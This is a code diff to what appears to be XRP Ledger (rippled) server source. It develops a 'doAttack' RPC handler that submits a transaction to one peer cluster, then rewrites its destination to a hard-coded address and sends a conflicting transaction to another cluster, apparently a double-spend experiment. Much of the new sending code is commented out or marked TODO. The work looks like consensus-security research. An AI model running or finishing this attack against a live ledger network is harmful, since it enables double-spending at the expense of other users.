@@ -26,6 +26,8 @@
 #include <ripple/app/misc/HashRouter.h>
 #include <ripple/app/misc/Transaction.h>
 #include <ripple/app/misc/ValidatorList.h>
+#include <ripple/ledger/RawView.h>
+#include <ripple/rpc/impl/TransactionSign.h>
 #include <ripple/app/tx/apply.h>
 #include <ripple/net/RPCErr.h>
 #include <ripple/protocol/ErrorCodes.h>
@@ -199,19 +201,12 @@ Json::Value doAttack (RPC::Context& context)
     changePeers(context, peers, 1, j);
 
     JLOG (j.warn()) << "Submit transaction to " << tx[jss::Destination];
-    // Add tx to Transaction Queue (TxQ) and view ?
     RPC::transactionSubmitAttack (
         context.params, failType, context.role,
         context.ledgerMaster.getValidatedLedgerAge(),
         context.app, RPC::getProcessTxnFnAttack (context.netOps));
 
     JLOG (j.warn()) << "Currently " << netOps.getLocalTxCount() << " transactions stored";
-
-    // Send all queued transactions
-    sendQueuedTransactions(context, j);     // TODO
-    
-    // Remove all transactions from TxQ / view ?
-    clearView(context, j);        // TODO
     
     // Change destination of tx -> this tx should be conflicting
     tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
@@ -228,23 +223,43 @@ Json::Value doAttack (RPC::Context& context)
         context.app, RPC::getProcessTxnFnAttack (context.netOps));
     
     // Send all queued transactions
-    sendQueuedTransactions(context, j);     // TODO
+    sendTransaction(context, j);     // TODO
 
     // Only connect to peers in cluster 1 (for debugging)
-    changePeers(context, peers, 1, j);
+    changePeers(context, peers, -1, j);
     return Json::Value();
 }
 
-void sendQueuedTransactions(RPC::Context& context, beast::Journal j) {
-    // TODO: implement this function
-    // For now: just print all peers we are connected to:
+void sendTransaction(RPC::Context& context, beast::Journal j) {
+    // ripple::Application& app = context.app;
+    // Json::Value tx_json = context.params;
+
+    // SigningForParams singForParams;
+    // transactionPreProcessResult preprocResult = transactionPreProcessImpl(
+    //     jvRequest, role, signForParams, validatedLedgerAge, app);
+
+    // auto const toSkip = context.app.getHashRouter().shouldRelay(e.transaction->getID());
+
+    // protocol::TMTransaction tx;
+    // Serializer s;
+
+    // e.transaction->getSTransaction()->add(s);
+    // tx.set_rawtransaction(s.data(), s.size());
+    // tx.set_status(protocol::tsCURRENT);
+    // tx.set_receivetimestamp(
+    //     app_.timeKeeper().now().time_since_epoch().count());
+    // tx.set_deferred(e.result == terQUEUED);
+    // // FIXME: This should be when we received it
+    // app_.overlay().relay(e.transaction->getID(), tx, *toSkip);
+    // e.transaction->setBroadcast();
+
+    // protocol::TMTransaction& m;
+    // auto const sm = std::make_shared<Message>(m, protocol::mtTRANSACTION);
+
     // auto peers = context.app.overlay ().getActivePeers();
-    // for (auto& peer : peers) {
-    //     auto peer_endpoint = peer->getRemoteAddress();
-    //     std::string addressString = peer_endpoint.address().to_string();
-    //     JLOG (j.warn()) << "sendQueuedTransactions: connected to " << addressString;
-    // }
-    return;
+
+    // for (auto const& p : peers)
+    //     p->send(sm);
 }
 
 void changePeers (RPC::Context& context, Overlay::PeerSequence peers, int cluster_idx, beast::Journal j) {
@@ -289,11 +304,6 @@ bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
     }
 }
 
-void clearView(RPC::Context& context, beast::Journal j) {   // TODO
-    auto& open_ledger = context.app.openLedger();
-    JLOG (j.warn()) << "clearView: open-ledger empty?: " << open_ledger.empty();
-    // open_ledger.apply_one(context.app, )
-}
 // End attacker code
 
 } // ripple
